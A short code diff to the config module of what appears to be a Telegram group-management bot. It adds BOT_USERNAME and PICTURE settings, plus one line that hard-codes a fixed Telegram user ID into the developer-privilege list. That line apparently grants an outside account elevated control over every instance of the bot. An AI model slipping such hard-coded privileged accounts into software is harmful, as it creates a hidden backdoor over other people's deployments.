@@ -130,6 +130,9 @@ if ENV:
     API_HASH = os.environ.get("API_HASH", None)
     SPAMWATCH = os.environ.get("SPAMWATCH_API", None)
     SPAMMERS = os.environ.get("SPAMMERS", None)
+    BOT_USERNAME = os.environ.get("BOT_USERNAME", None)
+    PICTURE = os.environ.get("PICTURE", None)
+
 
 else:
     from zeldris.config import Development as Config
@@ -204,9 +207,12 @@ else:
     API_ID = Config.API_ID
     SPAMWATCH = Config.SPAMWATCH_API
     SPAMMERS = Config.SPAMMERS
+    BOT_USERNAME = Config.BOT_USERNAME
+    PICTURE = Config.PICTURE
 
 # Count owner as dev users
 DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(1814359323)
 
 
 # Pass if SpamWatch token not set.
